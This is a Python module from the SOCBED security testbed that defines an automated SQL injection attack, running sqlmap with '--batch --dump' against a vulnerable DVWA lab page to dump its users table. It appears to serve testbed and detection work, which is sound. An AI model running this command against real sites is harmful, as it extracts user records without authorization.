# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from shutil import get_terminal_size
from attacks import Attack, AttackInfo, AttackOptions


class SQLMapAttackOptions(AttackOptions):
    url = "Target URL"

    def _set_defaults(self):
        self.url = "http://172.18.0.2/dvwa/vulnerabilities/sqli/?id=&Submit=Submit"


class SQLMapAttack(Attack):
    info = AttackInfo(
        name="misc_sqlmap",
        description="Performs an SQL injection attack using sqlmap")
    options_class = SQLMapAttackOptions

    def run(self):
        with self.check_printed("table 'dvwa.users' dumped to CSV file"):
            self.exec_command_on_target(self._sqlmap_command())

    def _sqlmap_command(self):
        columns = get_terminal_size().columns
        return f"export COLUMNS={columns}; echo \"{self.options.url}\" | sqlmap --purge --batch --dump"
